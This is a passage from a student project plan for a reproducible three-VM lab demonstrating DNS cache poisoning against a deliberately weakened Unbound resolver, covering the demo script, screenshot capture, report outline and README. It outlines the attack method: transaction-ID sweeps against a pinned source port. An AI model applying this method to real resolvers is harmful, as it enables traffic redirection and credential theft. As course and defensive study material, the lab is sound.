vagrant scp resolver:/tmp/poison.pcap "$PCAP_OUT" 2>/dev/null \
  || vagrant ssh resolver -c "cat /tmp/poison.pcap" > "$PCAP_OUT"

if (( SPOOFER_RC == 0 && VICTIM_RC == 0 )); then
  echo "[+] Part 1 demo SUCCESS  (pcap → $PCAP_OUT)"
  exit 0
else
  echo "[-] Part 1 demo FAILED  (spoofer=$SPOOFER_RC victim=$VICTIM_RC)"
  exit 1
fi
```

> **Note on `vagrant scp`:** Some Vagrant installs don't ship the `scp`
> plugin. If `vagrant scp` errors with "unknown command", install
> `vagrant plugin install vagrant-scp` once on the host. The fallback in
> the script (`cat | >`) works without the plugin but is slower for large
> pcaps.

- [ ] **Step 2: Make executable and run end-to-end**

```bash
chmod +x lab/scripts/run-part1.sh
./lab/scripts/run-part1.sh
```

Expected output ends with:
```
[+] Part 1 demo SUCCESS  (pcap → .../docs/captures/poison.pcap)
```

- [ ] **Step 3: Run it three times back-to-back to confirm reproducibility**

```bash
for i in 1 2 3; do ./lab/scripts/run-part1.sh; done
```

Expected: all three runs print SUCCESS. (This is the Day 3 exit criterion in spec §7.3.)

- [ ] **Step 4: Commit Chunk 5**

```bash
git add lab/victim/ lab/scripts/ lab/vagrant/provision-victim.sh
git commit -m "feat(orch): non-interactive demo + run-part1.sh end-to-end"
```

---

## Chunk 6: Capture screenshots + pcap (Day 3, all)

### Task 20: Capture remaining screenshots

Use the artifacts from a clean `run-part1.sh`. The pcap and `04`–`07` screenshots all come from this single demo run.

- [ ] **Step 1: `04-dig-poisoned.png`**

```bash
vagrant ssh victim -c "dig @192.168.56.20 www.target.lab"
```

Screenshot the full output (must show `ANSWER SECTION` with `192.168.56.10`). Save as `docs/screenshots/04-dig-poisoned.png`.

- [ ] **Step 2: `05-curl-pwned.png`**

```bash
vagrant ssh victim -c "curl -s http://www.target.lab/"
```

Screenshot the HTML output. Save as `docs/screenshots/05-curl-pwned.png`.

For a more dramatic shot, open the GUI on the victim VM (or browse from the host with `/etc/hosts` pointed at `192.168.56.20`) and screenshot the rendered page. Save as `docs/screenshots/05-curl-pwned.png` (replacing the terminal version) or as an additional `05b-browser-pwned.png`.

- [ ] **Step 3: `06-wireshark-overview.png`**

Open `docs/captures/poison.pcap` in Wireshark on the host. Apply display filter:

```
dns
```

Screenshot the packet list, showing:
1. The trigger query from attacker → resolver
2. The resolver's outbound query → 192.168.56.99
3. The flood of spoofed replies from .99 → resolver

Save as `docs/screenshots/06-wireshark-overview.png`.

- [ ] **Step 4: `07-wireshark-spoofed-reply.png`**

In the same Wireshark session, find the spoofed reply that matched (it's the one *immediately* preceding the next outbound query that the resolver does *not* make — i.e., the last spoof before the resolver caches). Expand the DNS layer. Screenshot the expanded packet showing:
- Transaction ID (matches the outbound query above it)
- Destination port = 33333
- Question section = `www.target.lab. A`
- Answer section = `192.168.56.10`

Save as `docs/screenshots/07-wireshark-spoofed-reply.png`.

- [ ] **Step 5: Commit**

```bash
git add docs/screenshots/04*.png docs/screenshots/05*.png \
        docs/screenshots/06*.png docs/screenshots/07*.png \
        docs/captures/poison.pcap
git commit -m "docs: capture all 7 screenshots + pcap from successful run"
```

---

## Chunk 7: Report + repo finalization (Day 3 → Day 4)

Goal: `docs/report/part1-draft.md` is complete with all sections referencing the captured artifacts. Repo `README.md` is enough for the grader to reproduce the lab from a clean clone.

### Task 21: Report skeleton

**Files:**
- Create: `docs/report/part1-draft.md`

- [ ] **Step 1: Drop the section skeleton in (Person C can do this on Day 1 in parallel)**

```markdown
# Part 1 — DNS Cache Poisoning

## 1. Lab Setup
[topology diagram → docs/screenshots/01-topology.png]
[VM specs table — copy from spec §2]
[network diagram]

## 2. Resolver Configuration
[annotated diff: vulnerable vs. hardened defaults]
[table from spec §3.1: directive → effect → defense disabled]

## 3. Threat Model
- Attacker capability: off-path; can send arbitrary UDP to 192.168.56.20.
- Attacker knowledge: resolver IP, fixed source port (33333), that target.lab is forwarded to a non-responsive IP.
- Out of scope: on-path MitM, ARP spoofing, BGP hijack.

## 4. Attack Methodology
- Trigger thread: ~6s cadence (matches Unbound's negative cache TTL).
- Flood thread: sweeps 65,536 transaction IDs.
- Match fields the resolver checks: dst IP, dst port, txid, qname.
- Why each defense bypassed (point to §2 table).

## 5. Execution & Evidence
[02-resolver-baseline.png with caption]
[03-spoofer-running.png with caption]
[04-dig-poisoned.png with caption]
[05-curl-pwned.png with caption]
[06-wireshark-overview.png with caption]
[07-wireshark-spoofed-reply.png with caption]
[demo.sh log excerpt]

## 6. Caveats
- Black-hole forwarder (192.168.56.99) means the legitimate response never arrives — simplifies the race vs. realistic Kaminsky.
- No NS-glue zone poisoning (single record only).
- Source-port pinning was forced; a real resolver with RFC 5452 randomization would be much harder.
```

- [ ] **Step 2: Fill sections 1–4 (do not require run artifacts)**

These can be written as soon as the design is approved. Person C should have these done by end of Day 1.

- [ ] **Step 3: Fill sections 5–6 from captured artifacts (Day 3)**

For each screenshot, write a one-sentence caption explaining what the reader is looking at and why it matters. Embed using Markdown image syntax.

- [ ] **Step 4: Commit**

```bash
git add docs/report/part1-draft.md
git commit -m "docs(report): part 1 draft complete"
```

### Task 22: Finalize README

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Expand README to a complete quickstart**

```markdown
# DNS Cache Poisoning Lab — Part 1

A reproducible 3-VM lab demonstrating DNS cache poisoning against a
deliberately-weakened Unbound resolver. Built for the Network Security
course project, May 2026.

## Architecture
Three Ubuntu 22.04 VMs on a host-only network 192.168.56.0/24:
- `attacker`  192.168.56.10   — runs spoofer.py and Nginx PWNED page
- `resolver`  192.168.56.20   — Unbound (weakened: source port 33333)
- `victim`    192.168.56.30   — runs dig + curl

Full design: `docs/specs/2026-05-05-dns-cache-poisoning-part1-design.md`

## Quickstart

Prereqs: VirtualBox 7.x, Vagrant ≥2.4, Hyper-V disabled (Windows hosts).

    cd lab/vagrant && vagrant up
    cd ../scripts && ./run-part1.sh

Expected last line: `[+] Part 1 demo SUCCESS`. Pcap is written to
`docs/captures/poison.pcap`.

## Repo Layout
[paste the file structure tree from the implementation plan §"File Structure"]

## Re-running the demo
    ./lab/scripts/reset-lab.sh    # flush cache, kill stale processes
    ./lab/scripts/run-part1.sh    # full demo

## Tearing down
    cd lab/vagrant && vagrant destroy -f
```

- [ ] **Step 2: Commit + tag**

```bash
git add README.md
git commit -m "docs: complete README quickstart"
git tag part1-complete
```

### Task 23: Demo video

- [ ] **Step 1: Plan the recording (2 min target)**

Three tiled terminals on the host (use Windows Terminal panes or OBS multi-source):
1. Top-left: `vagrant ssh attacker`
2. Top-right: `vagrant ssh resolver` (running tshark)
3. Bottom: `vagrant ssh victim`

Recording sequence:
1. Show `dig` SERVFAIL on victim (5 s)
2. Run `spoofer.py` on attacker, narrate the txid sweep (45 s)
3. Show `[+] poisoned` line (5 s)
4. Re-run `dig` on victim → `192.168.56.10` (5 s)
5. `curl` on victim → PWNED page (10 s)
6. Switch to Wireshark on host, show one spoofed packet expanded (30 s)
7. End card

- [ ] **Step 2: Record + upload**

Use OBS or Windows Game Bar (`Win+G`). Save as `docs/captures/part1-demo.mp4`. Upload to YouTube unlisted (or whatever platform the course requires) and put the link in `README.md`.

- [ ] **Step 3: Final commit + push**

```bash
git add docs/captures/part1-demo.mp4 README.md
git commit -m "docs: demo video for part 1"
git push -u origin main --tags
```

---

## Done

By end of Day 4 you have:
- Reproducible lab from `vagrant up` to `[+] Part 1 demo SUCCESS`
- Seven captioned screenshots in `docs/screenshots/`
- `poison.pcap` in `docs/captures/`
- Complete report draft in `docs/report/part1-draft.md`
- Demo video
- Repo tagged `part1-complete`

Parts 2 (Wireshark analysis using the same pcap) and 3 (DNSSEC defense, swapping the Unbound config to hardened) reuse this lab unchanged. Each will get its own spec → plan cycle.


